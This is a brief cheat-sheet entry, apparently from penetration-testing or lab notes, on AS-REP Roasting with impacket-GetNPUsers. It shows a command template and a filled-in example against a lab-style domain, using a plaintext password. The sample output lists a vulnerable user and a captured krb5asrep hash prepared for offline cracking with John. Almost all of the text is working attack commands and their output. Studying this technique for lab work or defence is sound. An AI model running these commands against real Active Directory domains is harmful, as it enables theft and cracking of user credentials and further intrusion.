Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking.

```bash
$ impacket-GetNPUsers -h
# quick command
$ impacket-GetNPUsers -dc-ip <DC_IP> -request -output <ciphers_out_file> -format john [[domain/]username[:password]]

# example
$ impacket-GetNPUsers -dc-ip 192.168.141.70 -request -outputfile hashes.asrep -format john corp.com/pete:"Nexus123\!"

# user account with option *Do not require Kerberos preauthentication* enabled, meaning it's vulnerable to AS-REP Roasting.

Name  MemberOf                                  PasswordLastSet             LastLogon                   UAC                            
----  ----------------------------------------  --------------------------  --------------------------  --------
dave  CN=Development Department,DC=corp,DC=com  2022-09-07 18:54:57.521205  2024-12-19 12:35:28.834856  0x410200 

$krb5asrep$dave@CORP.COM:3af6f3bf902b66ed8c34787ad4d1d478$15f513ffba8f371ca535938c09bd8f880c8d1dbbe20079...
```